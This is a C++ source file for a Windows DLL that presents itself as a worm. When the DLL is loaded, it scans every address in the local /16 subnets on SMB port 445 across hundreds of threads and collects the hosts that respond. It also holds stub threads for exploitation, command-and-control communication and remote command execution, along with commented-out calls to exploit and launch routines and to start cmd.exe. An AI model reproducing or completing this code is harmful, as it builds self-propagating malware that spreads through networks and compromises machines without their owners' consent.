// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "stdafx.h"
#include "worm.h"
#include <iostream>
#include "CGlobalConfig.h"
#include "CCASQueue.h"
#include <Winsock2.h>
using namespace std;
CCASQueue<string> *gCASQueue = NULL;
HANDLE hMutex = CreateMutex(NULL, FALSE, NULL);
int kk = 1;
int gParam[4096] = { 0 };
vector<vector<string>> GlobalIps(255);
vector<string> GlobalTempIps(1000);
void* PthreadWormScanSubnet(LPVOID lpParameter);
vector<string> split(const string& str, const string& delim) {
	vector<string> res;
	if ("" == str) return res;
	//先将要切割的字符串从string类型转换为char*类型  
	char* strs = new char[str.length() + 1]; //不要忘了  
	strcpy(strs, str.c_str());

	char* d = new char[delim.length() + 1];
	strcpy(d, delim.c_str());

	char* p = strtok(strs, d);
	while (p) {
		string s = p; //分割得到的字符串转换为string类型  
		res.push_back(s); //存入结果数组  
		p = strtok(NULL, d);
	}
	return res;
}

void GenerateScanIps()
{
	for (string ip : CGlobalConfig::gLocalIps) {
		string ip_byte_3 = split(ip, ".")[3];
		string ip_byte_2 = split(ip, ".")[2];
		string ip_byte_1 = split(ip, ".")[1];
		string ip_byte_0 = split(ip, ".")[0];

		char a[4] = { 0 };
		char b[4] = { 0 };

		int i, j;
		for (i = 0; i < 255; i++)
		{
			for (j = 1; j < 255; j++)
			{
				memset(a, 0, sizeof(a));
				memset(b, 0, sizeof(b));

				sprintf(a, "%d", i);
				sprintf(b, "%d", j);

				string tempIp = ip_byte_0 + string(".") + ip_byte_1 + string(".") + string(a) + string(".") + string(b);
				GlobalIps[i].push_back(tempIp);
				//cout << ipA << endl;
				//gCASQueue->enqueue(ipA);
			}

		}

		CGlobalConfig::gMapIps.insert({ip, GlobalIps});
	
	}

	//cout << CGlobalConfig::gMapIps << endl;

	for (map<string, vector<vector<string>>>::iterator it = CGlobalConfig::gMapIps.begin(); it != CGlobalConfig::gMapIps.end(); ++it)
	{
		string key = it->first;
		//cout << "***" << endl;
		//cout << key << endl;
		//cout << "***" << endl;

		vector<vector<string>> v = it->second;

		cout << "***" << endl;
		cout << v.size() << endl;
		cout << "***" << endl;

	}
	
	for (int i = 0; i < 4096; i++)
	{
		gParam[i] = i;
	}
#if 1
	int t = 0;
	for (map<string, vector<vector<string>>>::iterator it = CGlobalConfig::gMapIps.begin(); it != CGlobalConfig::gMapIps.end(); ++it)
	{
	    string key = it->first;
		vector<vector<string>> v = it->second;
		
		
		for (int i = 0; i < 255; i++)
		{
			 CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PthreadWormScanSubnet, (LPVOID)(int*)&gParam[i + t], 0, NULL);
			
		}
		t += 255;
		if (t >= 4096)
		{
			break;
		}

	}
#endif
	/*
	HANDLE handles[255] = { 0 };


	for (int m = 0; m < 10000; m++)
	{
		for (int i = 0; i < 0; i++)
		{
			WaitForSingleObject(handles[i], 4);
			cout << "kk" << endl;
		}
		Sleep(1000);
	}
*/

#if 0
	vector<string> ips(255);
	int i, j, k;
	char a[4] = { 0 };
	char b[4] = { 0 };
	char c[4] = { 0 };

	for (i = 0; i < 255; i++)
	{
		for (j = 0; j < 255; j++)
		{
			for (k = 1; k < 255; k++)
			{
				memset(a, 0, sizeof(a));
				memset(b, 0, sizeof(b));
				memset(c, 0, sizeof(c));
				sprintf(a, "%d", i);
				sprintf(b, "%d", j);
				sprintf(c, "%d", k);
				string ipA = string("10") + string(".") + string(a) + string(".") + string(b) + string(".") + string(c);
				GlobalIps[i].push_back(ipA);
				//cout << ipA << endl;
				//gCASQueue->enqueue(ipA);
			}

		}
	}
	cout << "current size " << GlobalIps.size() << endl;
#endif
#if 0


	for (i = 16; i < 32; i++)
	{
		for (j = 0; j < 255; j++)
		{
			for (k = 1; k < 255; k++)
			{
				memset(a, 0, sizeof(a));
				memset(b, 0, sizeof(b));
				memset(c, 0, sizeof(c));
				sprintf(a, "%d", i);
				sprintf(b, "%d", j);
				sprintf(c, "%d", k);
				string ipB = string("172") + string(".") + string(a) + string(".") + string(b) + string(".") + string(c);
				//gCASQueue->enqueue(ipB);
				GlobalIps[256 + (i-16)].push_back(ipB);

			}

		}
	}
	cout << "Gen ipB stop" << endl;
	//cout << "current size " << gCASQueue->GetCurSize() << endl;
#endif

#if 0

	for (j = 0; j < 255; j++)
	{
		for (k = 1; k < 255; k++)
		{
			memset(a, 0, sizeof(a));
            memset(b, 0, sizeof(b));
			sprintf(a, "%d", j);
			sprintf(b, "%d", k);
			string ipC = string("192") +string(".") + string("168") + string(".") + string(a) + string(".") + string(b);
			//cout << string("10") + string(".") + string(a) + string(".") + string(b) + string(".") + string(c) << endl;
			//gCASQueue->enqueue(ipC);
			GlobalIps[ 256 + 16 ].push_back(ipC);

		}
	}

	cout << "Gen ipC stop" << endl;
	//cout << "current size " << gCASQueue->GetCurSize() << endl;
	cout << "current size " << GlobalIps.size() << endl;
	for (string ip : GlobalIps[272]) {
		cout << ip << endl;
	}

#endif
}
BOOL Connect(char* lpszServerIp, int iServerPort)
{

	SOCKET sock = ::socket(AF_INET, SOCK_STREAM, 0);
	if (INVALID_SOCKET == sock) {
		return FALSE;
	}

	sockaddr_in  addr = { 0 };
	addr.sin_family = AF_INET;
	addr.sin_port = htons(iServerPort);
	addr.sin_addr.S_un.S_addr = ::inet_addr(lpszServerIp);
	unsigned long ul = 1;
	ioctlsocket(sock, FIONBIO, &ul); //设置为非阻塞模式
	if (0 != ::connect(sock, (sockaddr*)(&addr), sizeof(addr)))
	{
		closesocket(sock);
		return FALSE;
	}
	closesocket(sock);

	return TRUE;
}
void* PthreadWormScanSubnet(LPVOID lpParameter)
{



	//cout << "this is " << *(int*)lpParameter << endl;
	int k = *(int*)lpParameter / 255;
	vector<vector<string>> ips;

	int t = 0;
	for (map<string, vector<vector<string>>>::iterator it = CGlobalConfig::gMapIps.begin(); it != CGlobalConfig::gMapIps.end(); ++it)
	{
		if (t == k) {
			string key = it->first;
			ips = it->second;
			//cout << key << "0000000000"<< endl;
			break;
		}
		else
		{
			t++;
		}
	}
	
	//int tmp = 0;
	for (string ip : ips[*(int*)lpParameter % 255])
	{
		//cout << ip << endl;
		//Sleep(2000);
		//break;
		//tmp++;
		/*
		if (0 == *(int*)lpParameter && 0 == tmp % 100)
		{
			cout << "------------------" << endl;
			cout << ip << ":" << tmp << endl;

			cout << "------------------" << endl;
		}
		*/
		//cout << ip << endl;
		
		if(Connect((char *)ip.c_str(), 445))
		{
			cout << ip << endl;
			WaitForSingleObject(hMutex, INFINITE);
			GlobalTempIps.push_back(ip);
			ReleaseMutex(hMutex);
		}
		//GlobalTempIps.clear();
		//Sleep(20);
	}



	while (0) {

		//gCASQueue->dequeue(ip);
		//if (t % 2000 == 0) { cout << ip << endl; }
		//if(Connect((char *)ip.c_str(), 445))
		
		if (TRUE == Connect("192.168.1.1", 445))
		//if (0)
		{
			
			WaitForSingleObject(hMutex, INFINITE);
			//CGlobalConfig::gLocalIps.push_back(ip);
			ReleaseMutex(hMutex);
		}
	}
	//::WSACleanup();
	//Sleep(10000);
	cout << "===" << GlobalTempIps.size() << "==" << endl;

	return NULL;
}
void* PthreadWormWebServer(LPVOID lpParameter)
{
	while (TRUE) {
		Sleep(1000);
		cout << "This is Thread PthreadWormWebServer" << endl;
		cout << CGlobalConfig::gLocalIps.size() << endl;
	}
	return NULL;
}
void* PthreadWormExploit(LPVOID lpParameter)
{
	while (TRUE) {
		Sleep(1000);
		cout << "This is Thread PthreadWormExploit" << endl;
	}
	return NULL;
}
void* PthreadWormCommunication(LPVOID lpParameter)
{
	while (TRUE) {
		Sleep(1000);
		cout << "This is Thread PthreadWormCommunication" << endl;
	}
	return NULL;
}
void* PthreadWormExcuteRcs(LPVOID lpParameter)
{
	while (TRUE) {
		Sleep(1000);
		cout << "This is Thread PthreadWormExcuteRcs" << endl;
	}
	return NULL;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{


	




	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		//cout << "kaishi" << endl;
		//BOOL b = Connect("172.28.130.111", 445);
		//cout << b << endl;
		//Sleep(10000000);


		CWorm worm = CWorm();
		worm.Init();
		//gCASQueue = new CCASQueue<string>();
		//gCASQueue->init();

		GenerateScanIps();
		WSADATA wsaData = { 0 };
		::WSAStartup(MAKEWORD(2, 2), &wsaData);

		//int a[273] = { 0 };
#if 0
		for (int i = 0; i < 273; i++)
		{
			a[i] = i;
		}
		for (int i = 0 ; i < 273; i++)
		{
			//cout << *(int*)&a[i] << endl;
			HANDLE hThread0 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PthreadWormScanSubnet, (LPVOID)(int *)&a[i], 0, NULL);
			//HANDLE hThread = (HANDLE)_beginthreadex(NULL, 0, (_beginthreadex_proc_type)PthreadWormScanSubnet, NULL, 0, NULL);
		}
#endif		
		//w.Communicate();
		//w.WebService();
		
		//HANDLE hThread1 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PthreadWormScanSubnet, (LPVOID)&worm, 0, NULL);
		//HANDLE hThread2 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PthreadWormWebServer, (LPVOID)&worm, 0, NULL);
		//HANDLE hThread3 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PthreadWormExploit, (LPVOID)&worm, 0, NULL);
		//HANDLE hThread4 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PthreadWormCommunication, (LPVOID)&worm, 0, NULL);
		//HANDLE hThread5 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PthreadWormExcuteRcs, (LPVOID)&worm, 0, NULL);

		//worm.GenerateScanIps();

		//worm.Dequeue();
		//worm.Scan();
		//w.Exploit();
		//::WinExec("cmd.exe", SW_NORMAL);
		//worm.Launch();
		//WSACleanup();
		break;
	}

	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

